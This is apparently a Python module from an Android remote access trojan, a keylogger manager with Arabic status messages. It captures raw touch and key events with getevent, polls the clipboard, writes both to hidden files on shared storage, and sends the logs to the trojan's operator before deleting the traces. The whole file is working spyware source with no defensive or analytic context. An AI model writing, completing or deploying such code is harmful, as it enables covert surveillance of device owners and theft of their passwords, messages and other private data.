import os, time, threading, subprocess

class KeyloggerManager:
    def __init__(self, rat_instance):
        self.rat = rat_instance
        self.active = False
        self.thread = None
        self.log_file = "/sdcard/.keylog_data.txt"
        self.start_time = 0

    def start_logging(self, duration: int = 60) -> str:
        if self.active:
            return "⚠️ Keylogger يعمل بالفعل"
        if duration > 300:
            duration = 300
        if duration < 10:
            duration = 10
        self.active = True
        self.start_time = time.time()
        self.thread = threading.Thread(target=self._worker, args=(duration,), daemon=True)
        self.thread.start()
        return f"⌨️ بدأ ({duration} ثانية)... سيتم الإرسال بعد الانتهاء"

    def stop_logging(self) -> str:
        if not self.active:
            return "⚠️ لا يوجد Keylogger نشط"
        self.active = False
        elapsed = int(time.time() - self.start_time)
        os.system("killall getevent 2>/dev/null")
        time.sleep(1)
        if os.path.exists(self.log_file) and os.path.getsize(self.log_file) > 0:
            sz = os.path.getsize(self.log_file)
            sent = self.rat.send_file(self.log_file, f"⌨️ Keylogger | {elapsed} ثانية | {sz/1024:.1f}KB")
            os.system(f"rm -f {self.log_file}")
            return f"✅ Keylogger ({elapsed} ثانية)" if sent else "⚠️ فشل إرسال"
        return "⚠️ لم يسجل شيء"

    def _worker(self, duration: int):
        os.system(f"rm -f {self.log_file}")
        os.system(f"getevent -l > {self.log_file} 2>/dev/null &")
        end_time = time.time() + duration
        while time.time() < end_time and self.active:
            if int(time.time()) % 10 == 0 and os.path.exists(self.log_file):
                clip = subprocess.getoutput("dumpsys clipboard 2>/dev/null | grep -A 3 'ClipData' | head -10")
                if clip and "No items" not in clip:
                    with open(self.log_file, 'a', errors='ignore') as f:
                        f.write(f"\n[CLIPBOARD {time.strftime('%H:%M:%S')}]\n{clip}\n")
            time.sleep(1)
        os.system("killall getevent 2>/dev/null")

    def quick_snapshot(self) -> str:
        tmp = "/sdcard/.keylog_quick.txt"
        os.system(f"rm -f {tmp}")
        os.system(f"timeout 5 getevent -l > {tmp} 2>/dev/null &")
        time.sleep(6)
        os.system("killall getevent 2>/dev/null")
        if os.path.exists(tmp) and os.path.getsize(tmp) > 0:
            sent = self.rat.send_file(tmp, "⌨️ لقطة 5 ثوان")
            os.system(f"rm -f {tmp}")
            return "✅ لقطة سريعة" if sent else "⚠️ فشل إرسال"
        os.system(f"rm -f {tmp}")
        return "⚠️ لم يسجل شيء"

    def monitor_clipboard(self, duration: int = 30) -> str:
        tmp = "/sdcard/.clipboard_log.txt"
        os.system(f"rm -f {tmp}")
        end = time.time() + duration
        with open(tmp, 'w', errors='ignore') as f:
            f.write(f"=== Clipboard Monitor {time.strftime('%Y-%m-%d %H:%M:%S')} ===\n\n")
            while time.time() < end and self.active:
                clip = subprocess.getoutput("dumpsys clipboard 2>/dev/null | grep -A 5 'ClipData' | head -10")
                if clip and "No items" not in clip:
                    f.write(f"[{time.strftime('%H:%M:%S')}]\n{clip}\n\n")
                    f.flush()
                time.sleep(2)
        if os.path.exists(tmp) and os.path.getsize(tmp) > 50:
            sent = self.rat.send_file(tmp, f"📋 حافظة ({duration} ثانية)")
            os.system(f"rm -f {tmp}")
            return f"✅ حافظة ({duration} ثانية)" if sent else "⚠️ فشل إرسال"
        os.system(f"rm -f {tmp}")
        return "⚠️ لا محتوى"
